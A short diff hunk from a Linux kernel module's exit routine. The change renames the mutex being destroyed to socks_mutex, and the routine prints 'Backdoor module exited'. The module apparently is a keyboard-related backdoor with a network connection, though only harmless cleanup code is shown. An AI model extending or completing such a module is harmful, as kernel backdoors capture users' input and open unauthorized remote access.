@@ -113,7 +113,7 @@ static void __exit keyboard_module_exit(void) {
     }
 
     del_timer(&connection_timer);
-    mutex_destroy(&my_mutex);
+    mutex_destroy(&socks_mutex);
 
     printk(KERN_INFO "Backdoor module exited\n");
 }
